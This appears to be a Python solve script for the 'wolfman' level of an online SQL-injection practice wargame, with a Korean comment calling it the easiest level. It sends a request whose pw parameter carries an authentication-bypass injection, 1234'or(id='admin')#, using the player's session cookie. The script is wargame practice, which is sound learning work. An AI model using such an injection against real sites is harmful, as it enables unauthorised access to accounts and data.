import requests
from dotenv import load_dotenv
import os

load_dotenv()
#여기 있는 문제중 제일 쉬웠던거가틈..
url=os.environ.get('LOS_URL')+'chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=1234%27or(id=%27admin%27)%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "WOLFMAN Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)